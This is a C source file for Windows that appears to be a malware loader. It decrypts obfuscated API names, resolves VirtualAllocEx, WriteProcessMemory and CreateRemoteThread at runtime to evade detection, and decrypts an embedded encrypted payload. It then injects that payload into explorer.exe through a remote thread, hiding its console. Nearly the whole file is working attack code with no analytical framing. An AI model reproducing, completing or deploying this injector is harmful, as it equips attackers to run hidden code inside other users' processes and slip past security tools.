#include <windows.h>

#include <assert.h>
#include <psapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>

#pragma comment (lib, "crypt32.lib")
#pragma comment(lib, "advapi32")

#include "resources.h"

unsigned char sVirtualAlloc[] = { 0xc0, 0x36, 0x3, 0x68, 0x83, 0xa0, 0xe3, 0xf0, 0x51, 0x4a, 0x60, 0x76, 0x8, 0xa2, 0x75, 0xdb };
unsigned char sVirtualAllocEx[] = { 0xc7, 0x6c, 0xcd, 0x62, 0x57, 0xb0, 0xea, 0xd8, 0x66, 0xc, 0xda, 0x5b, 0x35, 0x80, 0x5, 0xb2 };
unsigned char sWriteProcessMemory[] = { 0xd8, 0x3e, 0x33, 0x27, 0xb, 0xf0, 0xc2, 0x54, 0xe7, 0xf6, 0x7c, 0x55, 0xa6, 0xfb, 0xec, 0xe2, 0xf8, 0xcd, 0x7b, 0xe8, 0x7e, 0xcd, 0x27, 0x9, 0x4f, 0xa0, 0xeb, 0xe5, 0x99, 0xa4, 0xf3, 0x8b };
unsigned char sCreateRemoteThread[] = { 0x8b, 0x62, 0x2d, 0x41, 0xfb, 0xfc, 0x9f, 0xc6, 0x4f, 0x72, 0x7b, 0x2b, 0x79, 0x17, 0x5e, 0x21, 0xfd, 0xf8, 0xc5, 0x8e, 0x85, 0x9a, 0x10, 0x58, 0x2f, 0x14, 0x8d, 0x1e, 0xed, 0x9f, 0x54, 0x7e };

unsigned char payload[] = { 0x61, 0x5d, 0xd9, 0x76, 0x31, 0x50, 0x2f, 0xa7, 0xd4, 0xed, 0x63, 0xc9, 0xa9, 0x2d, 0xbf, 0xe8, 0x9d, 0xeb, 0xe1, 0x3a, 0x1e, 0x45, 0x0, 0x2, 0x36, 0x66, 0xd1, 0x1e, 0xdf, 0xbb, 0xed, 0xe2, 0x8b, 0x60, 0x75, 0xf1, 0xe2, 0x4f, 0xa9, 0x12, 0x24, 0xd8, 0xc2, 0x14, 0x2c, 0xa2, 0x71, 0x34, 0x60, 0x17, 0x3c, 0xba, 0x29, 0xbd, 0x1b, 0x67, 0x70, 0xd5, 0x21, 0x9, 0xf4, 0x11, 0xf6, 0x6f, 0xa8, 0xf1, 0x78, 0xe9, 0x12, 0x38, 0x20, 0x27, 0x28, 0x33, 0x8, 0xaf, 0x94, 0x3f, 0xb7, 0x54, 0xc4, 0xa1, 0x2e, 0x29, 0x33, 0x64, 0x7, 0x23, 0xcb, 0xec, 0xea, 0x4e, 0x92, 0x1d, 0x9d, 0xf3, 0xc9, 0xa5, 0x72, 0xe, 0xb6, 0x2c, 0xb1, 0x7a, 0x4c, 0x6c, 0x5, 0x27, 0x5a, 0xe8, 0x23, 0xa8, 0x92, 0xdb, 0x9b, 0x63, 0x54, 0xdc, 0xb0, 0xf5, 0xed, 0x68, 0xb1, 0x86, 0xc, 0x3, 0xb5, 0xe5, 0xd6, 0x80, 0xdc, 0xa4, 0x3, 0xe7, 0x89, 0xbc, 0x8c, 0x9d, 0xbc, 0x42, 0x55, 0x8d, 0xb1, 0xd7, 0x75, 0xf4, 0x75, 0x37, 0x30, 0xe6, 0x40, 0xd3, 0x6b, 0x69, 0x83, 0x96, 0x1, 0xed, 0x58, 0x3a, 0x8d, 0x50, 0x30, 0xb6, 0x9a, 0xf4, 0x80, 0x57, 0xf1, 0x5, 0x2f, 0x1c, 0xa4, 0xd6, 0x2c, 0x1b, 0x6c, 0x5f, 0x33, 0xd6, 0x58, 0xb9, 0xa2, 0xbe, 0xc0, 0x4f, 0x1f, 0x68, 0x42, 0xd9, 0x2b, 0x44, 0xd5, 0x37, 0x84, 0xc0, 0x2d, 0x4a, 0x48, 0x37, 0x45, 0x48, 0x39, 0x5, 0x9, 0x1d, 0xe9, 0x30, 0xa1, 0x77, 0x8d, 0x96, 0xf, 0x4c, 0x63, 0x3a, 0x90, 0x8, 0xd4, 0xad, 0xf6, 0x3, 0x53, 0x20, 0x5e, 0xe6, 0x62, 0xe, 0x91, 0xbb, 0xad, 0x7a, 0x50, 0x41, 0x3b, 0xdb, 0x41, 0x5a, 0x52, 0x59, 0x48, 0x26, 0x62, 0x1d, 0x9, 0x3c, 0xc2, 0x54, 0xd5, 0x56, 0x1c, 0x0, 0xf8, 0x65, 0xd7, 0xd, 0x57, 0x62, 0x71, 0xdb, 0x34, 0x91, 0x47, 0x9e, 0x52, 0x23, 0xdc, 0x6e, 0x87, 0x77, 0xde, 0x72, 0x53, 0xf7, 0x5, 0xa2, 0xbb, 0xfa, 0xe5, 0x53, 0x63, 0xd9, 0x6d, 0x5c, 0xb9, 0x4e, 0x14, 0xcd };
unsigned int payload_len = sizeof(payload);

char key [] = { 0x41, 0x41, 0x64, 0x54, 0x6a, 0x62, 0x4f, 0x2b, 0x58, 0x55, 0x41, 0x4b, 0x6d, 0x65, 0x68, 0x6c, 0x44, 0x61, 0x68, 0x31, 0x61, 0x77, 0x3d, 0x3d };

LPVOID (WINAPI * pVirtualAlloc)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
);

LPVOID (WINAPI * pVirtualAllocEx) (
	HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
);

BOOL (WINAPI * pWriteProcessMemory)(
	HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T  *lpNumberOfBytesWritten
);

HANDLE (WINAPI * pCreateRemoteThread)(
	HANDLE                 hProcess,
    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    SIZE_T                 dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID                 lpParameter,
    DWORD                  dwCreationFlags,
    LPDWORD                lpThreadId
);

void DecryptAES (char * pData, size_t dataLen, char * pKey, size_t keyLen ){
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;
	
	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT) ||
	    !CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash) ||
		!CryptHashData(hHash, (BYTE *)pKey, (DWORD)keyLen, 0) ||
		!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey) ||
		!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, pData, &dataLen)) 
		return -1;
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;	
}

int Initialize(){
	DecryptAES((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx),(char *) key, sizeof(key));
	DecryptAES((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory),(char *) key, sizeof(key));
	DecryptAES((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread),(char *) key, sizeof(key));
	DecryptAES((char *) sVirtualAlloc, sizeof(sVirtualAlloc),(char *) key, sizeof(key));
	
	pVirtualAlloc = GetProcAddress(GetModuleHandle("kernel32.dll"),sVirtualAlloc);
	pVirtualAllocEx = GetProcAddress(GetModuleHandle("kernel32.dll"),sVirtualAllocEx);
	pWriteProcessMemory = GetProcAddress(GetModuleHandle("kernel32.dll"),sWriteProcessMemory);
	pCreateRemoteThread = GetProcAddress(GetModuleHandle("kernel32.dll"),sCreateRemoteThread);

	assert(pVirtualAlloc);
	assert(pVirtualAllocEx);
	assert(pWriteProcessMemory);
	assert(pCreateRemoteThread);

	if (*pVirtualAlloc || 
	    *pVirtualAllocEx || 
		*pWriteProcessMemory || 
		*pCreateRemoteThread){
			printf("KERNEL LINKED\n");
			return 0;
		}

	return -1;
}

int FindTarget(const char * procname) {
	HANDLE hProc;
	PROCESSENTRY32 pe32;
	int PID = 0;
	
	hProc = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if (INVALID_HANDLE_VALUE == hProc) return 0;
		
	pe32.dwSize = sizeof(PROCESSENTRY32);
	
	if (!Process32Next(hProc, &pe32)) {
		CloseHandle(hProc);
		return 0;
	}
	
	while (Process32Next(hProc, &pe32)) {
		if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
			PID = pe32.th32ProcessID;
			break;
		}
	}
	CloseHandle(hProc);
	return PID;
}

int InjectionInProc(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
	LPVOID pRemote = NULL;
	HANDLE hTread = NULL;
	
	pRemote = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	pWriteProcessMemory(hProc, pRemote, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
	
	hTread = pCreateRemoteThread(hProc, NULL, 0, pRemote, NULL, 0, NULL);
	
	if(hTread != NULL) {
		WaitForSingleObject(hTread, 500);
		CloseHandle(hTread);
		printf("THREAD OPENED\n");
		return 0;
	}
	return -1;
}

int main(void) {
	void * exec_mem;
	
	int PID = 0;
	HANDLE hProc = NULL;

	BOOL rv;
	DWORD oldprotect = 0;
	
	HRSRC res;
	HGLOBAL resHandle;

	//unsigned char * payload;
	//unsigned int payload_len;

	FreeConsole();
	
	Initialize();

	//res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	//resHandle = LoadResource(NULL, res);

	//assert(res);
	//assert(resHandle);

	//payload = (char *) LockResource(resHandle);
	//payload_len = SizeofResource(NULL, res);

	assert(payload);
	assert(payload_len);

	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	RtlMoveMemory(exec_mem, payload, payload_len);

	DecryptAES((char *) exec_mem, payload_len, key, sizeof(key));

	PID = FindTarget("explorer.exe");
	if(PID) {
		printf("DROP 0x%-016p\n", (void *)payload);
		printf("DROP LEN 0x%-016p\n", (void *)payload_len);
		printf("DROP BUF 0x%-016p\n", (void *)exec_mem);
		printf("KEY 0x%-016p\n", (void *)key);
		printf("P I D - %d \n", PID);

		hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD) PID);
	
		if(hProc != NULL) {
			InjectionInProc(hProc, exec_mem, payload_len);
			CloseHandle(hProc);
		}
	}
	
	return 0;
}
